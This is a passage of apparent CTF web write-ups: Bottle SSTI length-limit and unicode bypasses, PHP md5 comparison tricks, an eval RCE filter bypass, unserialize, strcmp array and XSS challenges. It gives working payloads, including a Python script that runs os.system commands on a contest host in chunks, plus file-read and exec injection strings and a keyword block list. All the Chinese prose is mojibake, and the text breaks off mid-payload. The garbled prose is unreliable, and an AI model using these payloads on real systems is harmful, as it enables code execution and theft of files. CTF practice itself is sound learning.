<p>ä½†æ˜¯è¿™é¢˜å‘½ä»¤æ²¡æœ‰å›æ˜¾ï¼Œ å¯ä»¥åˆ©ç”¨flaskä¸­çš„é™æ€è·¯ç”±<code>/static</code>ç”¨cpæŠŠflag copyè¿‡å» æ³¨æ„å…ˆç”¨mkdir staticåˆ›å»ºç›®å½•ï¼Œ å¾—åˆ°ä¸€å¼ ç…§ç‰‡ï¼Œ<br><img src="https://pic1.imgdb.cn/item/68613e8a58cb8da5c87e1aa0.png"><br>åœ¨<a href="https://toolgg.com/image-decoder.html%E4%B8%AD%E8%A7%A3%E5%AF%86">https://toolgg.com/image-decoder.htmlä¸­è§£å¯†</a><br><img src="https://pic1.imgdb.cn/item/68613ebf58cb8da5c87e1c3c.png"></p>
<h2 id="å‡ºé¢˜äººå·²ç–¯"><a href="#å‡ºé¢˜äººå·²ç–¯" class="headerlink" title="å‡ºé¢˜äººå·²ç–¯"></a>å‡ºé¢˜äººå·²ç–¯</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   app.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 15:52:17</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    payload = bottle.request.query.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload <span class="keyword">and</span> <span class="built_in">len</span>(payload) &lt; <span class="number">25</span> <span class="keyword">and</span> <span class="string">&#x27;open&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload <span class="keyword">and</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload:</span><br><span class="line">        <span class="keyword">return</span> bottle.template(<span class="string">&#x27;hello &#x27;</span>+payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bottle.abort(<span class="number">400</span>, <span class="string">&#x27;Invalid payload&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œä¸»è¦è€ƒå¯Ÿçš„æ˜¯payloadçš„é•¿åº¦è¦å°äº25<br>ä¹Ÿæ˜¯ä¸€é“sstiçš„é—®é¢˜<br>è¿™é¢˜åˆ©ç”¨çš„æ˜¯pythonä¸­çš„osç‰¹æ€§ å°±æ˜¯æˆ‘ä»¬å¯ä»¥æŠŠå˜é‡å­˜åœ¨osçš„å±æ€§ä¸­ï¼Œè¿™ä¸ªå±æ€§å¯ä»¥æ˜¯è‡ªå·±åˆ›å»ºçš„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MOONSCRIPT"><figure class="iseeu highlight /moonscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="built_in">os</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">os</span>.a = <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">os</span>.a)</span><br></pre></td></tr></table></figure></div>
<p>è¾“å‡ºå°±æ˜¯1<br>æ€è·¯å°±æ˜¯æŠŠpayloadåˆ†æˆç‰‡æ®µå°ç»„ï¼Œå­˜åœ¨osçš„å±æ€§ä¸­ ç„¶åæ‰§è¡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">â€‹</span><br><span class="line">url=<span class="string">&#x27;http://gz.imxbt.cn:20750/attack&#x27;</span></span><br><span class="line">â€‹</span><br><span class="line">payload=<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls /&gt;123&#x27;)&quot;</span></span><br><span class="line">â€‹</span><br><span class="line">â€‹</span><br><span class="line">p=[payload[i:i+<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload),<span class="number">4</span>)]</span><br><span class="line">flag=<span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        tmp=<span class="string">f&#x27;\n%import os;os.a=&quot;<span class="subst">&#123;i&#125;</span>&quot;&#x27;</span></span><br><span class="line">        flag=<span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp=<span class="string">f&#x27;\n%import os;os.a+=&quot;<span class="subst">&#123;i&#125;</span>&quot;&#x27;</span></span><br><span class="line">    r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:tmp&#125;)</span><br><span class="line">r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:<span class="string">&quot;\n%import os;eval(os.a)&quot;</span>&#125;)</span><br><span class="line">r=requests.get(url,params=&#123;<span class="string">&quot;payload&quot;</span>:<span class="string">&quot;\n%include(&#x27;123&#x27;)&quot;</span>&#125;).text</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure></div>
<p>è¿™æ ·å­æ¯æ¬¡æ‰§è¡Œçš„æ—¶å€™ï¼Œç‰‡æ®µé•¿åº¦éƒ½å¾ˆçŸ­ï¼Œæœ€åæ‰§è¡Œos.aä¸­çš„å·¦å³å†…å®¹<br>å› ä¸ºæ¨¡æ¿ä¸­å¼€å¤´æ˜¯<code>%</code>è¡¨ç¤ºæ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥è¦ç”¨\nç¡®ä¿åœ¨è¡Œé¦–<br>ç„¶åæ²¡æœ‰å›æ˜¾å°±è¦å†™å…¥æ–‡ä»¶</p>
<p>è¿™é¢˜è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ç”¨unicodeç»•è¿‡     <code>&#123;&#123;Âºpen('/flag').read()&#125;&#125;</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>Â unidecodeÂ <span class="keyword">import</span>Â unidecode</span><br><span class="line"><span class="keyword">for</span>Â iÂ <span class="keyword">in</span>Â <span class="built_in">range</span>(<span class="number">257</span>):</span><br><span class="line">Â  Â Â <span class="keyword">if</span>(<span class="built_in">chr</span>(i)!=<span class="string">&quot;o&quot;</span>Â <span class="keyword">and</span>Â <span class="string">&quot;o&quot;</span>==unidecode(<span class="built_in">chr</span>(i))):</span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(<span class="built_in">chr</span>(i))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Âº&#x27;</span>.encode())</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°<code>b&#39;\xc2\xba&#39;</code> ä½†æ˜¯è¦æŠŠ<code>/xc2</code>å»æ‰ï¼Œå› ä¸ºå¹³æ—¶ç”¨çš„utf-8æ˜¯å¤šå­—ç¬¦ç¼–ç ï¼Œè€Œlatin-1æ˜¯å•å­—èŠ‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">&#x27;Âº&#x27;</span>.encode()</span></span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">&#x27;Âº&#x27;</span>.encode()</span></span><span class="selector-class">.decode</span>(<span class="string">&#x27;latin-1&#x27;</span>))</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">&quot;\xba&quot;</span>)</span></span></span><br><span class="line"></span><br><span class="line">b<span class="string">&#x27;\xc2\xba&#x27;</span></span><br><span class="line">Ã‚Âº</span><br><span class="line">Âº</span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥çœ‹å‡ºåŒºåˆ«</p>
<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HANDLEBARS"><figure class="iseeu highlight /handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">/attack?payload=</span><span class="template-variable">&#123;&#123;%<span class="name">BApen</span>(%<span class="name">27/flag</span>%<span class="number">27</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
<h2 id="å‡ºé¢˜äººåˆç–¯"><a href="#å‡ºé¢˜äººåˆç–¯" class="headerlink" title="å‡ºé¢˜äººåˆç–¯"></a>å‡ºé¢˜äººåˆç–¯</h2><p>å’Œä¸Šé¢˜çš„è§£æ³•2 ä¸€æ · æŠŠaæ›¿æ¢ä¸º%aa</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HANDLEBARS"><figure class="iseeu highlight /handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">/attack?payload=</span><span class="template-variable">&#123;&#123;%<span class="name">BApen</span>(%<span class="name">27/flag</span>%<span class="number">27</span>).re%aad()&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
<p><code>%</code>åé¢åŠ ä¸¤ä¸ªåå…­è¿›åˆ¶æ•°æ˜¯urlç¼–ç çš„æ ¼å¼<br><img src="https://s3.bmp.ovh/imgs/2025/06/30/d165f1b49f36ebfb.png"></p>
<p>å‚è€ƒï¼š<br><a href="https://mp.weixin.qq.com/s/T7y6IlFSyV1utTmCbgxL4Q">https://mp.weixin.qq.com/s/T7y6IlFSyV1utTmCbgxL4Q</a><br><a href="https://www.mcso.top/computer/ctf/xyctf2025-fate/">https://www.mcso.top/computer/ctf/xyctf2025-fate/</a><br><a href="https://www.mcso.top/computer/ctf/xyctf2025-ez_puzzle/">https://www.mcso.top/computer/ctf/xyctf2025-ez_puzzle/</a><br><a href="https://yzbrh.github.io/post/8cae4c93.html#Now-you-see-me-1">https://yzbrh.github.io/post/8cae4c93.html#Now-you-see-me-1</a><br><a href="https://blog.csdn.net/Python1111111/article/details/147084841">https://blog.csdn.net/Python1111111/article/details/147084841</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>xmuæ–°ç”Ÿèµ›web wp</title>
    <url>/posts/19220.html</url>
    <content><![CDATA[<p>xmuæ–°ç”Ÿèµ›web wp</p>
<span id="more"></span>
<h1 id="ez-md5"><a href="#ez-md5" class="headerlink" title="ez_md5"></a>ez_md5</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="variable">$password</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wrong!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;wrong!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> wrong!</span><br></pre></td></tr></table></figure></div>
<p>è¾“å…¥ä¸¤ä¸ªmd5ä¸€æ ·çš„å€¼å°±å¯ä»¥äº†<br>payload:<br><img src="https://pic1.imgdb.cn/item/68352fc158cb8da5c810786b.png"></p>
<h1 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez_rce"></a>ez_rce</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">å±…ç„¶éƒ½ä¸è¾“å…¥å‚æ•°ï¼Œå¯æ¶!!!!!!!!! <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">## æ”¾å¼ƒæŠŠï¼Œå°ä¼™å­ï¼Œä½ çœŸçš„ä¸ä¼šRCE,ä½•å¿…åœ¨æ­¤çº ç»“å‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;çœ‹çœ‹ä½ è¾“å…¥çš„å‚æ•°ï¼ï¼ï¼ä¸å«æ ·å­ï¼ï¼&#x27;</span>;<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ä½ æƒ³å¹²ä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å±…ç„¶éƒ½ä¸è¾“å…¥å‚æ•°ï¼Œå¯æ¶!!!!!!!!!&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œç¦ç”¨äº†å¾ˆå¤šå‡½æ•°ï¼Œä½†æ˜¯æ˜¾ç„¶è¿˜æ˜¯æ²¡æœ‰ç¦å®Œï¼Œå¯ä»¥ç”¨åå¼•å·æˆ–è€…execæ‰§è¡Œå‘½ä»¤ï¼Œç„¶åç”¨print_rå‡½æ•°è®©ç»“æœå›æ˜¾<br>å¦‚<code>?code=print_r(exec(&quot;whoami&quot;));</code><br>ä¸‹ä¸€æ­¥å°±æ˜¯æ‰¾åˆ°flagä½ç½® <code>?code=print_r(exec(&quot;find%20/&quot;));</code> è¿™ä¸ªå‘½ä»¤å¯ä»¥è·å–æ ¹ç›®å½•ä¸‹é¢çš„æ–‡ä»¶ï¼Œè¿™é‡Œåªèƒ½è·å–åˆ°ä¸€ä¸ªæ–‡ä»¶<code>/fffffffffflagafag</code> ç„¶åç”¨nlå‘½ä»¤æŸ¥çœ‹å°±å¯ä»¥äº†</p>
<h1 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span>  = <span class="string">&quot;this_is_secret&quot;</span>; </span><br><span class="line"><span class="variable">$password</span>  = <span class="string">&quot;this_is_not_known_to_you&quot;</span>; </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//here I changed those two </span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="variable">$data_unserialize</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> username <span class="keyword">or</span> password error!</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå°±æ˜¯æŠŠä¼ å…¥çš„infoæ•°æ®ååºåˆ—åŒ– å¦‚æœååºåˆ—åŒ–å‡ºæ¥çš„å€¼å’Œé¢˜ç›®è¦æ±‚çš„ä¸€æ ·å°±å¯ä»¥<br>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;this_is_secret&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;this_is_not_known_to_you&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><code>a:2:&#123;s:8:&quot;username&quot;;s:14:&quot;this_is_secret&quot;;s:8:&quot;password&quot;;s:24:&quot;this_is_not_known_to_you&quot;;&#125;</code></p>
<h1 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h1><p><img src="https://pic1.imgdb.cn/item/68356aa058cb8da5c811e24b.png"></p>
<p>æ‰“å¼€f12 åœ¨æ³¨é‡Šé‡Œæ‰¾åˆ°ç¬¬ä¸€æ®µflag ç„¶ååœ¨ç½‘ç»œä¸­çš„æ ‡å¤´é‡Œé¢æ‰¾åˆ°flagå­—æ®µå¯¹åº”flagçš„ç¬¬äºŒæ®µ</p>
<h1 id="å‰å¥³å‹"><a href="#å‰å¥³å‹" class="headerlink" title="å‰å¥³å‹"></a>å‰å¥³å‹</h1><p>æŸ¥çœ‹é¡µé¢æºä»£ç  æœ‰ä¸€ä¸ªcode.txtå¯ä»¥è·³è½¬ï¼Œå¾—åˆ°ä¸€æ®µphpä»£ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$v1</span> != <span class="variable">$v2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$v3</span>, <span class="variable">$flag</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå…³é”®è®©strcmp()çš„è¿”å›å€¼æ˜¯0å°±å¥½ï¼Œè¿™é‡Œå°±è®©v3æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè¿™æ ·å°±å¯ä»¥è¿”å›null<br>payload: <code>?v1=240610708&amp;v2=QNKCDZO&amp;v3[]=1</code></p>
<h1 id="d0-U-kn0W-XSS"><a href="#d0-U-kn0W-XSS" class="headerlink" title="d0_U_kn0W_XSS"></a>d0_U_kn0W_XSS</h1><p><img src="https://pic1.imgdb.cn/item/68356c9758cb8da5c811f4c6.png"><br>è¿™é¢˜åªè¦&#x3D;&#x3D;è§¦å‘xsså°±å¯ä»¥äº† <code>?id=&lt;script&gt;alert(1)&lt;/script&gt;</code> ç„¶ååœ¨æ³¨é‡Šä¸­æ‰¾åˆ°flag</p>
<h1 id="Leveling-up"><a href="#Leveling-up" class="headerlink" title="Leveling up"></a>Leveling up</h1><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><img src="https://pic1.imgdb.cn/item/68356d7858cb8da5c811f9e4.png"><br>æ³¨é‡Šä¸­å‡ºç°<code>disallow:</code>çš„æç¤ºï¼Œæ‰€ä»¥æŸ¥çœ‹robots.txt å¾—åˆ°ç¬¬äºŒå…³çš„åœ°å€level_2_1s_h3re.php</p>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//here is level 2</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a1</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>];</span><br><span class="line">    <span class="variable">$a2</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a1</span> == <span class="variable">$a2</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;????&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$a1</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$a2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 2 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œè¦a1ä¸ç­‰äºa2 ï¼Œä½†æ˜¯md5æ˜¯å¼ºç­‰äºï¼Œä¹‹å‰åšçš„éƒ½æ˜¯å¼±æ¯”è¾ƒï¼Œåœ¨ç½‘ä¸Šæœphp md5å¼ºæ¯”è¾ƒç›¸ç­‰å¯ä»¥å¾—åˆ°payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">a<span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%00</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%55</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span>&amp;b<span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%02</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span 